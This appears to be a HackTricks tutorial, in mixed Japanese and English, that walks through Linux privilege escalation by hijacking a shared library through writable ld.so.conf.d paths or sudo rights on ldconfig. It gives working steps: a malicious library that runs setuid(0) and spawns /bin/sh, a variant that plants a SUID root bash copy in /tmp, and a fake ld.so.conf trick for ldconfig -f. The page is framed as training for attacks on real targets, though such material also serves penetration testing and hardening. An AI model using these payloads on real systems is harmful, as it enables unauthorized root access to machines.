# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

## 環境を準備する

以下のセクションでは、環境を準備するために使用するファイルのコードを確認できます

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **作成** those files を同じフォルダであなたのマシンに作成する
2. **コンパイル** the **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so` を `/usr/lib` に **コピー** し、キャッシュを更新する: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **コンパイル** the **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Check the environment

_check that _libcustom.so_ is being **loaded** from _/usr/lib_ and that you can **execute** the binary._
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### 有用な triage コマンド

実際の target を attack する場合、binary が必要とする **exact library name** と、loader が **currently resolving** しているものを verify してください:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
いくつかの役立つ注意点:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` は通常 **動作しません**。これは
  リダイレクトが現在の shell によって実行されるためです。代わりに
  `echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` を使ってください。
- **SUID/privileged** binaries は **secure-execution mode** では `LD_LIBRARY_PATH`/`LD_PRELOAD` を無視しますが、
  `/etc/ld.so.conf` 由来のディレクトリは依然として信頼された loader configuration の一部なので、この misconfiguration は
  依然として privileged programs に影響を与える可能性があります。
- 新しい glibc バージョンでは、dynamic loader は `--list-diagnostics` も公開しており、cache resolution や
  `glibc-hwcaps` サブディレクトリの選択を debug するのに便利です。hijack が期待どおりに動作しないときに役立ちます。

## Exploit

このシナリオでは、_etc/ld.so.conf/_ 内のファイルに **脆弱なエントリが作成された** と仮定します:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
脆弱なフォルダは _/home/ubuntu/lib_（ここには書き込み権限があります）です。\
**以下のコードをダウンロードして、そのパス内でコンパイル**してください:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
後で脆弱な binary を **root**（または別の特権アカウント）が実行することを期待するなら、通常は対話型 shell を起動するよりも **root-owned artifact** を残しておく方がよいです。例えば：
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Then, after the privileged execution happens, you can use `/tmp/rootbash -p`.

今や、**misconfigured** パス内に悪意ある libcustom library を**作成**したので、**reboot** を待つか、root user が **`ldconfig`** を実行するのを待つ必要があります（_この binary を **sudo** として実行できる場合、または **suid bit** がある場合は、自分で実行できます_）。

これが起きたら、`sharedvuln` executable が `libcustom.so` library をどこから読み込んでいるかを**再確認**してください:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
ご覧のとおり、**`/home/ubuntu/lib` から読み込んでおり**、もし任意のユーザーがそれを実行すると、シェルが実行されます:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> この例では権限昇格はしていませんが、実行されるコマンドを改変し、**root または他の特権ユーザーが脆弱なバイナリを実行するのを待つ**ことで、権限昇格できるようになります。

### Other misconfigurations - Same vuln

前の例では、管理者が **/etc/ld.so.conf.d/ 内の設定ファイルに特権のないフォルダを指定した** という誤設定を偽装しました。\
しかし、同じ脆弱性を引き起こす他の誤設定もあります。**/etc/ld.so.conf.d`s の中の何らかの config file**、**/etc/ld.so.conf.d** のフォルダ、または **/etc/ld.so.conf** のファイルに **write permissions** があれば、同じ脆弱性を設定して exploit できます。

## Exploit 2

**ldconfig に対する sudo privileges があると仮定します**。\
`ldconfig` に **どこから conf files を読み込むか** を指定できるので、これを利用して `ldconfig` に任意のフォルダを読み込ませることができます。\
では、"/tmp" を読み込むために必要なファイルとフォルダを作成しましょう:
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
では、**前の exploit** で示したように、**悪意のあるライブラリを `/tmp` 内に作成**します。\
そして最後に、パスを読み込み、バイナリがどこからライブラリをロードしているか確認しましょう:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**ご覧のとおり、`ldconfig` に対する sudo 権限があれば、同じ脆弱性を悪用できます。**



## References

- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
{{#include ../../banners/hacktricks-training.md}}
